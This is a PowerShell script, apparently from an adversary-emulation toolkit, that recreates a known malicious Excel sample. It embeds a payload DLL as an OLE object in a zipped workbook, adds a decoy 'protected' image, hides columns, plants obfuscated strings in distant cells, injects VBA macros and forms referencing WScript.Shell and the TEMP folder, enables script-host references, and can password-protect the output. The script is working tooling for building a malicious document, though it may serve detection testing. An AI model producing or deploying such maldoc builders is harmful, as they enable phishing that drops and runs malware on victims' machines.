Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

https://otx.alienvault.com/indicator/file/f615f7d0a7982f6c7242b4c536c7807e
https://www.joesandbox.com/analysis/284441/0/html

Sample Hash: f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226


#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    CleanDirectory

    $name = RandTextAlpha -len 5
    $zip = BuildAttachment -out "$PSScriptRoot\$name.xls" -payload "$PSScriptRoot\payloads\artifact.dll"

    $xlApp = New-Object -COMObject "Excel.Application"
    $xlApp.Visible = $false
    $fname = "$PSScriptRoot\Book1.xlsx"
    $xlBook = $xlApp.workbooks.open($fname)

    # Set Workbook to R1C1 style notation
    $xlApp.ReferenceStyle = "xlR1C1"

    $ws = $xlBook.Worksheets.Item(1)
    $merge = $ws.Range("A1:W70")
    $merge.Select() | Out-Null
    $merge.MergeCells = 1 

    $ws.Columns("B").ColumnWidth = 2
    $ws.Columns("C").ColumnWidth = 0
    $ws.Columns("D").ColumnWidth = 0
    $ws.Columns("I").ColumnWidth = $ws.Columns("I").ColumnWidth * 10

    # Cells.Item(row, column)
    $ws.Cells.Item(115,2) = ".zip"
    $ws.Cells.Item(120,9) = "TWZ8go1dntdPp7IIjUCGPVyrH7RXJLSm51zxMqyZPVea71DNuhKF1Fc8yHzjFdDKJ1UyHl63wMZ3RyuQCdCBbmuyXB9eZotMsDzggfgjlQjoOip9nSPBJbJxFvJfl1cisnJo8nKx7tqtdgTOl91hH2cq4bJTEb7tOb5AIbb9hsEqTpuzK43ma4JAlsu6NZ35v7Ncksgk81apwUGNQjiJhUsTA"
    $ws.Cells.Item(211,10) = "ppQevrzI4WKrprXSnj4tdzVPpDQsWKN3KOd1C4FSZW1Scz4ZVyGjZgBZCaY1JgVtiQQJo6ptNlDpIdNYIZGyeEdDnnyBfNiSbGKuSuLYimFOLlrzw9sSIwoMNmwbHXo9cUobBsgooRp18y1c69egvzjNs7Q"
    $ws.Cells.Item(219,1) = "Gqq1YmRaLOGNvmeu6QmyyDmXk1R33IrslAH5qvltTeEYpRddlRwM5fHceCQ8DXgcwoB5OjeJF3Nu8xIBXOQklNwg2E1XOnY67BBaqiycNVhbAneP4pkYg51R1vcjrp5sdRwG6HkOqOGyGuOOAk4ycaYcKSj4goTxZY8RZHTveEIByBlFPwShvGpd3u5mxpIb4iIRw6Y3zHtHAwMjGNoTEMctI4YELG8X6GHq3DiTGZRXmRLGQVOTbYFrgoiChtq2JFK4YwqdEDmO4ng1ssWY1nVhapjNu"

    # https://www.reddit.com/r/PowerShell/comments/4j2rp8/using_powershell_to_insert_an_object_text_file/
    # https://docs.microsoft.com/en-us/office/vba/api/excel.oleobjects.add
    $missing = [System.Type]::missing
    $ws.OLEObjects().Add($missing, $zip, $false, $true, $missing, $missing, $missing, $missing, $missing, $missing) | Out-Null
    Remove-Item -Path $zip

    # https://docs.microsoft.com/en-us/office/vba/api/excel.shapes.addpicture
    $sheet1 = $xlBook.Sheets.Item("Sheet1")
    $sheet1.Shapes.AddPicture("$PSScriptRoot\protected.png", 0, 1, 0, 0, -1, -1) | Out-Null

    $classCode = [System.IO.File]::ReadAllText("$PSScriptRoot\macros\class.txt")
    $class = $xlBook.VBProject.VBComponents.Add(2)
    $class.CodeModule.AddFromString($classCode) | Out-Null
    $class.Name = "Lumene"

    $userform1 = $xlBook.VBProject.VBComponents.Add(3)

    $label1 = $userform1.Designer.Controls.Add("Forms.Label.1")
    $label1.Height = 18
    $label1.Width = 72
    $label1.Top = 54
    $label1.Left = 24
    $label1.Caption = "Label1"
    $label1.Tag = "\oleObject1.bin"

    $label11 = $userform1.Designer.Controls.Add("Forms.Label.1")
    $label11.Name = "Label11"
    $label11.Height = 18
    $label11.Width = 150
    $label11.Top = 72.05
    $label11.Left = 102
    $label11.Caption = "xl\embeddings\oleObject1.bin"
    $label11.Tag = "xl\embeddings\oleObject1.bin"

    $form0 = $xlBook.VBProject.VBComponents.Add(3)
    $form0.Name = "Form0"

    $combobox = $form0.Designer.Controls.Add("Forms.ComboBox.1")
    $combobox.Height = 18
    $combobox.Width = 72
    $combobox.Top = 18
    $combobox.Left = 132
    $combobox.Tag = "WScript.Shell"

    $textbox1 = $form0.Designer.Controls.Add("Forms.TextBox.1")
    $textbox1.Height = 18
    $textbox1.Width = 72
    $textbox1.Top = 24
    $textbox1.Left = 24
    $textbox1.Tag = "TEMP"

    $textbox3 = $form0.Designer.Controls.Add("Forms.TextBox.1")
    $textbox3.Name = "Textbox3"
    $textbox3.Height = 18
    $textbox3.Top = 66
    $textbox3.Left = 24
    $textbox3.Text = "\oleObject*.bin"
    $textbox3.ControlTipText = "Templates"

    # need to investigate how to add this programatically rather than creating
    # the form and exporting
    # need to write a "bitmap" to the $welcomedialog.Properties("Picture").Value
    # it takes in an object of some type... need to investigate
    $welcomedialog = $xlBook.VBProject.VBComponents.Import("$PSScriptRoot\forms\WelcomeDialog.frm")

    $thisWorkbookMacro = [System.IO.File]::ReadAllText("$PSScriptRoot\macros\thisworkbook.txt")
    $thisWorkbook = $xlBook.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromString($thisWorkbookMacro) | Out-Null

    $module1Macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macros\module1.txt")
    $vbamodule1 = $xlBook.VBProject.VBComponents.Add(1)
    $vbamodule1.CodeModule.AddFromString($module1Macro) | Out-Null

    $module2Macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macros\module2.txt")
    $vbamodule2 = $xlBook.VBProject.VBComponents.Add(1)
    $vbamodule2.CodeModule.AddFromString($module2Macro) | Out-Null

    # In order for module5 to work, you need to enable the 'Windows Script Object Model'
    # and the 'Microsoft Shell Controls and Automation'
    #
    # To enable this manually, in the VBA code window click Tools -> References and 
    # click the checkbox for 'Windows Script Host Object Model' and 'Microsoft Shell
    # Controls and Automation'

    # Enabling the Windows Script Object Model
    $xlBook.VBProject.References.AddFromFile("C:\Windows\System32\wshom.ocx") | Out-Null
    # Enabling the Microsoft Shell Controls and Automation
    $xlBook.VBProject.References.AddFromFile("C:\Windows\SysWOW64\shell32.dll") | Out-Null

    $module5Macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macros\module5.txt")
    $vbamodule5 = $xlBook.VBProject.VBComponents.Add(1)
    RenameVBAModule -officeObject $xlBook -from "Module3" -to "Module5"
    $vbaModule5.CodeModule.AddFromString($module5Macro) | Out-Null

    # 56 is needed for xls
    # https://docs.microsoft.com/en-us/office/vba/api/Excel.XlFileFormat
    if (!$pass) {
        $xlBook.SaveAs($out, 56)
        $xlBook.Close()
        $xlApp.Quit()
    } else {
        $xlBook.SaveAs($out, 56, $pass)
        $xlBook.Close()
        $xlApp.Quit()
    }

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable xlBook
    Remove-Variable xlApp
    

}

function BuildAttachment() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$true)]
        [String]
        $payload
    )

    # this function is needed because we're need to create 2 of the same document

    $xlApp = New-Object -COMObject "Excel.Application"
    $xlApp.Visible = $false
    $fname = "$PSScriptRoot\Book1.xlsx"
    $xlBook = $xlApp.workbooks.open($fname)

    # Set Workbook to R1C1 style notation
    $xlApp.ReferenceStyle = "xlR1C1"

    $ws = $xlBook.Worksheets.Item(1)
    $merge = $ws.Range("A1:W70")
    $merge.Select() | Out-Null
    $merge.MergeCells = 1 

    $ws.Columns("B").ColumnWidth = 2
    $ws.Columns("C").ColumnWidth = 0
    $ws.Columns("D").ColumnWidth = 0
    $ws.Columns("I").ColumnWidth = $ws.Columns("I").ColumnWidth * 10

    # https://docs.microsoft.com/en-us/office/vba/api/excel.shapes.addpicture
    $sheet1 = $xlBook.Sheets.Item("Sheet1")
    $sheet1.Shapes.AddPicture("$PSScriptRoot\protected.png", 0, 1, 0, 0, -1, -1) | Out-Null

    # 56 is needed for xls
    # https://docs.microsoft.com/en-us/office/vba/api/Excel.XlFileFormat
    if (!$pass) {
        $xlBook.SaveAs($out, 51)
        $xlBook.Close()
        $xlApp.Quit()
    } else {
        $xlBook.SaveAs($out, 51, $pass)
        $xlBook.Close()
        $xlApp.Quit()
    }

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable xlBook
    Remove-Variable xlApp

    $fname = $out.split("\\")[-1]
    $fnameNoExtension = $fname.split(".")[0]

    Copy-Item -LiteralPath $out -Destination "$PSScriptRoot\$fnameNoExtension.zip"
    Remove-Item -Path $out
    Expand-Archive -LiteralPath "$PSScriptRoot\$fnameNoExtension.zip" -DestinationPath "$PSScriptRoot\$fnameNoExtension"
    Remove-Item -Path "$PSScriptRoot\$fnameNoExtension.zip"
    New-Item -Path "$PSScriptRoot\$fnameNoExtension\xl\embeddings" -ItemType "directory" | Out-Null
    Copy-Item -Path $payload -Destination "$PSScriptRoot\$fnameNoExtension\xl\embeddings\oleObject1.bin"

    Compress-Archive -LiteralPath "$PSScriptRoot\$fnameNoExtension\[Content_Types].xml",
        "$PSScriptRoot\$fnameNoExtension\xl\",
        "$PSScriptRoot\$fnameNoExtension\docProps\",
        "$PSScriptRoot\$fnameNoExtension\_rels\" -DestinationPath "$PSScriptRoot\$fnameNoExtension.zip"

    Remove-Item -Path "$PSScriptRoot\$fnameNoExtension" -Recurse
    Rename-Item -Path "$PSScriptRoot\$fnameNoExtension.zip" -NewName "$PSScriptRoot\$fnameNoExtension.xlsx"
    Compress-Archive -Path "$PSScriptRoot\$fnameNoExtension.xlsx" -DestinationPath "$PSScriptRoot\$fnameNoExtension.zip"
    Remove-Item -Path "$PSScriptRoot\$fnameNoExtension.xlsx"

    return "$PSScriptRoot\$fnameNoExtension.zip"

}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    return $macro

}

function CleanDirectory() {
    Remove-Item "$PSScriptRoot\*" -include *.zip
}